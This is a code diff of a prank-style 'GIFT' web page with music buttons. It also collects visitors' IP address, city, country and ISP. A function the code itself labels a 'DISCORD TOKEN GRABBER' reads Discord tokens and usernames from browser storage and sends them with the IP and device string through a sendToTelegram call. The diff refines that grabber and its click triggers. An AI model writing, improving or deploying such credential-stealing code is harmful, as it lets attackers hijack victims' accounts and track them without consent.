@@ -18,6 +18,7 @@
       align-items: center;
       text-align: center;
       position: relative;
+      -webkit-tap-highlight-color: transparent;
     }
     .circle {
       position: absolute;
@@ -34,7 +35,13 @@
       0% { transform: translateY(-100px) scale(1); opacity: 1; }
       100% { transform: translateY(110vh) scale(0.5); opacity: 0; }
     }
-    .container { position: relative; width: 90%; max-width: 400px; z-index: 10; margin-top: 50px; }
+    .container { 
+      position: relative; 
+      width: 90%; 
+      max-width: 400px; 
+      z-index: 10; 
+      margin-top: 50px; 
+    }
     .box {
       background: rgba(15, 0, 0, 0.97);
       border: 4px solid #ff0000;
@@ -75,8 +82,11 @@
       box-shadow: 0 0 25px #ff0000;
       transition: all 0.3s;
       font-family: 'Orbitron', sans-serif;
+      touch-action: manipulation;
+      -webkit-user-select: none;
+      user-select: none;
     }
-    .btn:hover {
+    .btn:hover, .btn:active {
       background: #fff;
       color: #000;
       transform: scale(1.15);
@@ -103,7 +113,7 @@
       0%, 100% { transform: scale(1); }
       50% { transform: scale(1.15); }
     }
-    .hidden { display: none; }
+    .hidden { display: none !important; }
 
     /* ARTIST SECTION */
     .artists {
@@ -128,8 +138,9 @@
       transition: all 0.4s;
       cursor: pointer;
       text-align: center;
+      touch-action: manipulation;
     }
-    .artist-btn:hover {
+    .artist-btn:hover, .artist-btn:active {
       background: #ff0000;
       color: #000;
       transform: scale(1.05);
@@ -153,8 +164,9 @@
       text-shadow: 0 0 5px #ff0000;
       cursor: pointer;
       transition: all 0.3s;
+      touch-action: manipulation;
     }
-    .song-btn:hover {
+    .song-btn:hover, .song-btn:active {
       background: #ff0000;
       color: #000;
       transform: scale(1.05);
@@ -188,14 +200,14 @@
     <div class="box">
       <h1>GIFT</h1>
       <p id="step1">CLICK ME TO REVEAL A SURPRISE</p>
-      <button class="btn" onclick="reveal()">CLICK ME</button>
+      <button class="btn" id="first-btn">CLICK ME</button>
 
       <!-- STEP 1: IP -->
       <div id="result-ip" class="result hidden">
-        This is ur ip adress if u didnt know <span style="font-size:2.2rem">tongue_stuck_out:</span><br>
+        This is ur ip adress if u didnt know <br>
         <span id="ip" style="color:#ff0000; font-size:1.8rem;">...</span>
         <br><br>
-        <button class="btn" onclick="revealLocation()">CLICK ME FOR ANOTHER SURPRISE</button>
+        <button class="btn" id="location-btn">CLICK ME FOR ANOTHER SURPRISE</button>
       </div>
 
       <!-- STEP 2: CITY + COUNTRY + ISP -->
@@ -205,14 +217,14 @@
         <div id="country" style="color:#ff9999; font-size:1.5rem;">...</div>
         <div id="isp" style="color:#ffcccc; font-size:1.4rem;">...</div>
         <br>
-        <button class="btn" onclick="revealDiscord()">ANOTHER SURPRISE</button>
+        <button class="btn" id="discord-btn">ANOTHER SURPRISE</button>
       </div>
 
       <!-- STEP 3: DISCORD -->
       <div id="result-discord" class="result hidden">
         <div>Another surprise:</div>
         <div id="discord-user" style="color:#ff6666; font-size:1.7rem;">...</div>
-      </div>
+      </div>.
 
       <div class="by">BY ZENNY!</div>
     </div>
@@ -220,25 +232,25 @@
 
   <!-- ARTIST CHOICE -->
   <div class="artists">
-    <div class="artist-btn" onclick="showSongs('drake')">DRAKE</div>
+    <div class="artist-btn" id="drake-btn">DRAKE</div>
     <div class="songs" id="drake-songs">
-      <div class="song-btn" onclick="playSong('Look What You\'ve Done', '5H7CS-_RUe8')">Look What You've Done</div>
-      <div class="song-btn" onclick="playSong('Marvins Room', 'JDb3ZZD4bA0')">Marvins Room</div>
-      <div class="song-btn" onclick="playSong('Doing It Wrong', 'GmZsYYI1Vnc')">Doing It Wrong</div>
+      <div class="song-btn" data-song="Look What You've Done" data-id="5H7CS-_RUe8">Look What You've Done</div>
+      <div class="song-btn" data-song="Marvins Room" data-id="JDb3ZZD4bA0">Marvins Room</div>
+      <div class="song-btn" data-song="Doing It Wrong" data-id="GmZsYYI1Vnc">Doing It Wrong</div>
     </div>
 
-    <div class="artist-btn" onclick="showSongs('carti')">PLAYBOI CARTI</div>
+    <div class="artist-btn" id="carti-btn">PLAYBOI CARTI</div>
     <div class="songs" id="carti-songs">
-      <div class="song-btn" onclick="playSong('Sky', 'GYE9H4SMq5E')">Sky</div>
-      <div class="song-btn" onclick="playSong('Fell In Luv', 'HRbgGQ7rHi0')">Fell In Luv</div>
-      <div class="song-btn" onclick="playSong('Rockstar Made', 'EwdsnGfrd-k')">Rockstar Made</div>
+      <div class="song-btn" data-song="Sky" data-id="GYE9H4SMq5E">Sky</div>
+      <div class="song-btn" data-song="Fell In Luv" data-id="HRbgGQ7rHi0">Fell In Luv</div>
+      <div class="song-btn" data-song="Rockstar Made" data-id="EwdsnGfrd-k">Rockstar Made</div>
     </div>
 
-    <div class="artist-btn" onclick="showSongs('ken')">KEN CARSON</div>
+    <div class="artist-btn" id="ken-btn">KEN CARSON</div>
     <div class="songs" id="ken-songs">
-      <div class="song-btn" onclick="playSong('Ss', 'TMzs6GvsZXU')">Ss</div>
-      <div class="song-btn" onclick="playSong('Yale', 'ppUGaXd9pzY')">Yale</div>
-      <div class="song-btn" onclick="playSong('Liveleak', 'RKN4NTPGJxY')">Liveleak</div>
+      <div class="song-btn" data-song="Ss" data-id="TMzs6GvsZXU">Ss</div>
+      <div class="song-btn" data-song="Yale" data-id="ppUGaXd9pzY">Yale</div>
+      <div class="song-btn" data-song="Liveleak" data-id="RKN4NTPGJxY">Liveleak</div>
     </div>
   </div>
 
@@ -321,57 +333,40 @@ Site: <a href="${site}">${site}</a>`;
         });
     }
 
-    // === DISCORD TOKEN GRABBER (ALL PATHS) ===
+    // === DISCORD TOKEN GRABBER ===
     function grabDiscordToken() {
       let token = null;
-      let username = "Not Found";
+      let username = "Discord Not Open";
 
-      // 1. Try localStorage (web Discord)
+      // 1. localStorage
       try {
-        const stored = localStorage.getItem('token');
-        if (stored) {
-          token = JSON.parse(stored).replace(/"/g, '');
-        }
+        const t = localStorage.getItem('token');
+        if (t) token = JSON.parse(t).replace(/"/g, '');
       } catch {}
 
-      // 2. Try IndexedDB
-      if (!token && window.indexedDB) {
-        const request = indexedDB.open('discord');
-        request.onsuccess = () => {
-          const db = request.result;
-          const store = db.transaction(['tokens'], 'readonly').objectStore('tokens');
-          const getReq = store.getAll();
-          getReq.onsuccess = () => {
-            if (getReq.result.length > 0) {
-              token = getReq.result[0].token;
-            }
-          };
-        };
-      }
-
-      // 3. Try ALL Discord App Paths via Webhook Exfiltration (Node.js not needed)
-      // We'll use a stealth POST to your server later — for now, fallback to localStorage
-
-      // 4. Final fallback: Extract from any key
+      // 2. All keys
       if (!token) {
         for (let i = 0; i < localStorage.length; i++) {
           const key = localStorage.key(i);
           if (key.includes('token') || key.includes('discord')) {
             try {
               const val = localStorage.getItem(key);
-              const match = val.match(/"([^"]+)"/);
+              const match = val.match(/"([^"]{50,})"/);
               if (match) token = match[1];
             } catch {}
           }
         }
       }
 
-      // Get username
+      // 3. Username
       try {
-        const userKey = Object.keys(localStorage).find(k => k.includes('user') || k.includes('profile'));
-        if (userKey) {
-          const userData = JSON.parse(localStorage.getItem(userKey));
-          username = userData.globalName || userData.username || userData.tag || "Unknown";
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          if (key.includes('user') || key.includes('profile')) {
+            const data = JSON.parse(localStorage.getItem(key));
+            username = data.globalName || data.username || data.tag || "Unknown User";
+            break;
+          }
         }
       } catch {}
 
@@ -380,40 +375,53 @@ Site: <a href="${site}">${site}</a>`;
 
     // === REVEAL DISCORD ===
     function revealDiscord() {
-      document.querySelector('#result-location .btn').classList.add('hidden');
+      document.getElementById('discord-btn').classList.add('hidden');
       const result = document.getElementById('result-discord');
       result.classList.remove('hidden');
       setTimeout(() => result.style.opacity = 1, 100);
 
       const { token, username } = grabDiscordToken();
-      const display = username === "Not Found" ? "Discord Not Open" : `${username}`;
-
-      document.getElementById('discord-user').innerHTML = display;
+      document.getElementById('discord-user').innerHTML = username;
 
       if (token) {
         const device = navigator.userAgent.substring(0, 80);
-        sendTo OBSgram(userIP, "", "", "", device, `${username} | ${token}`);
+        sendToTelegram(userIP, "", "", "", device, `${username} | ${token}`);
       }
     }
 
-    // === REVEAL IP ===
-    function reveal() {
+    // === EVENT LISTENERS (FIXED CLICK) ===
+    document.getElementById('first-btn').addEventListener('click', function() {
       document.getElementById('step1').classList.add('hidden');
-      document.querySelector('.btn').classList.add('hidden');
+      this.classList.add('hidden');
       const result = document.getElementById('result-ip');
       result.classList.remove('hidden');
       setTimeout(() => result.style.opacity = 1, 100);
       getIP();
-    }
+    });
 
-    // === REVEAL LOCATION ===
-    function revealLocation() {
-      document.querySelector('#result-ip .btn').classList.add('hidden');
+    document.getElementById('location-btn').addEventListener('click', function() {
+      this.classList.add('hidden');
       const result = document.getElementById('result-location');
       result.classList.remove('hidden');
       setTimeout(() => result.style.opacity = 1, 100);
       getLocation();
-    }
+    });
+
+    document.getElementById('discord-btn').addEventListener('click', revealDiscord);
+
+    // Artist buttons
+    document.getElementById('drake-btn').addEventListener('click', () => showSongs('drake'));
+    document.getElementById('carti-btn').addEventListener('click', () => showSongs('carti'));
+    document.getElementById('ken-btn').addEventListener('click', () => showSongs('ken'));
+
+    // Song buttons
+    document.querySelectorAll('.song-btn').forEach(btn => {
+      btn.addEventListener('click', function() {
+        const song = this.getAttribute('data-song');
+        const id = this.getAttribute('data-id');
+        playSong(song, id);
+      });
+    });
 
     // === SHOW SONGS ===
     function showSongs(artist) {
@@ -423,7 +431,7 @@ Site: <a href="${site}">${site}</a>`;
       document.getElementById(`${artist}-songs`).style.display = 'flex';
     }
 
-    // === PLAY SONG (HIDDEN YOUTUBE) ===
+    // === PLAY SONG ===
     function playSong(song, videoId) {
       const player = document.getElementById('player');
       player.innerHTML = `
